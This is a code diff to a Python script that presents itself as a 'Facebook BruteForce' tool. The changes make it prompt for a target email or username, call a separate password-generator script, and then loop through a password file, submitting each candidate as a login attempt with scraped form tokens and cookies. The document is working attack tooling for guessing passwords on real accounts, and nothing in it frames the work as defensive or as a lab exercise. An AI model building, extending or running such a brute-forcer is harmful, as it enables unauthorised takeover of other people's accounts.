@@ -2,6 +2,7 @@ import os.path
 import requests
 from bs4 import BeautifulSoup
 import sys
+import subprocess
 
 if sys.version_info[0] != 3:
     print('''\t--------------------------------------\n\t\tREQUIRED PYTHON 3.x\n\t\tinstall and try: python3 
@@ -17,6 +18,13 @@ HEADERS = {
 PAYLOAD = {}
 COOKIES = {}
 
+def call_password_generator():
+    """Call the passwords_generator.py script to generate the passwords."""
+    try:
+        subprocess.run(['python3', 'passwords_generator.py'], check=True)
+    except subprocess.CalledProcessError as e:
+        print("Error occurred while running password_generator.py:", e)
+        sys.exit(1)
 
 def create_form():
     form = dict()
@@ -29,7 +37,6 @@ def create_form():
     if data.input['name'] == 'lsd':
         form['lsd'] = data.input['value']
     return form, cookies
-
 
 def is_this_a_password(email, index, password):
     global PAYLOAD, COOKIES
@@ -44,15 +51,21 @@ def is_this_a_password(email, index, password):
         return True
     return False
 
-
 if __name__ == "__main__":
     print('\n---------- Welcome To Facebook BruteForce ----------\n')
+    
+    email = input('Enter Email/Username to target: ').strip()
+
+    # Call the password generator script
+    call_password_generator()
+
     if not os.path.isfile(PASSWORD_FILE):
-        print("Password file is not exist: ", PASSWORD_FILE)
+        print("Password file does not exist: ", PASSWORD_FILE)
         sys.exit(0)
+
     password_data = open(PASSWORD_FILE, 'r').read().split("\n")
     print("Password file selected: ", PASSWORD_FILE)
-    email = input('Enter Email/Username to target: ').strip()
+    
     for index, password in zip(range(password_data.__len__()), password_data):
         password = password.strip()
         if len(password) < MIN_PASSWORD_LENGTH:
